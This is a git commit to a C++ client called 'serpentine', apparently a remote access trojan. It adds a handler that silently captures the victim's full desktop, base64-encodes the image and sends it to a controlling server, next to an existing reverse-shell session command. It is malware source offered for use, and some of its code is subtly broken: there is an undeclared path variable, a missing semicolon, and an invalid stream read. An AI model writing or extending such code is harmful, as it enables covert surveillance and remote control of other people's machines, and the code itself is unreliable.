fc58fab0b16a238507fc3a879649bf1aac320633
Hikmat Jafarli <jafarlihi@gmail.com>
2020-12-25 15:51:03 +0400

    Implement screenshot fetching

--- client/serpentine/controller.cpp
+++ client/serpentine/controller.cpp
@@ -50,6 +50,9 @@ void Controller::dispatch(std::string message) {
 	case RequestType::CREATE_REVERSE_SHELL_SESSION:
 		Controller::createReverseShellSession(messageJson);
 		break;
+	case RequestType::GET_SCREENSHOT:
+		Controller::getScreenshot(messageJson);
+		break;
 	}
 }
 
@@ -143,3 +146,79 @@ void Controller::createReverseShellSession(json::json message) {
 	Networking::sendToServer(response.dump());
 }
 
+void Controller::getScreenshot(json::json message) {
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    HGDIOBJ hTempBitmap;
+    HBITMAP hBitmap;
+    BITMAP bAllDesktops;
+    HDC hDC, hMemDC;
+    LONG lWidth, lHeight;
+    BYTE *bBits = NULL;
+    HANDLE hHeap = GetProcessHeap();
+    DWORD cbBits, dwWritten = 0;
+    HANDLE hFile;
+    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+
+    hDC = GetDC(NULL);
+    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+
+    lWidth = bAllDesktops.bmWidth;
+    lHeight = bAllDesktops.bmHeight;
+
+    DeleteObject(hTempBitmap);
+
+    bfHeader.bfType = (WORD)('B' | ('M' << 8));
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    biHeader.biSize = sizeof(BITMAPINFOHEADER);
+    biHeader.biBitCount = 24;
+    biHeader.biCompression = BI_RGB;
+    biHeader.biPlanes = 1;
+    biHeader.biWidth = lWidth;
+    biHeader.biHeight = lHeight;
+
+    bInfo.bmiHeader = biHeader;
+
+    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;
+
+    hMemDC = CreateCompatibleDC(hDC);
+    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
+    SelectObject(hMemDC, hBitmap);
+    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
+
+
+    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
+    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
+    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
+
+    CloseHandle(hFile);
+
+    DeleteDC(hMemDC);
+    ReleaseDC(NULL, hDC);
+
+	IStream *stream = NULL;
+	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
+	CImage image;
+
+	image.Attach(hBitmap);
+	image.Save(stream, Gdiplus::ImageFormatJPEG)
+
+	std::string fileString((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
+	std::string fileBase64String = base64_encode(fileString);
+
+	json::json response;
+	response["id"] = message["id"];
+	response["file"] = fileBase64String;
+	Networking::sendToServer(response.dump());
+
+    DeleteObject(hBitmap);
+}
